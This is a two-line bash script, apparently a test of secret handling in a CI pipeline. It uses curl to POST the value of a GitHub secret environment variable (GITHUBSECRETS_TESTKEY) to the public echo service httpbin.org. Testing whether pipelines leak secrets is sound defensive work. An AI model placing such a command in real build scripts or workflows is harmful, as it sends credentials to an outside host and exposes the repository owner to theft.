#!/bin/bash
curl https://httpbin.org/post -X POST -d "$GITHUBSECRETS_TESTKEY"
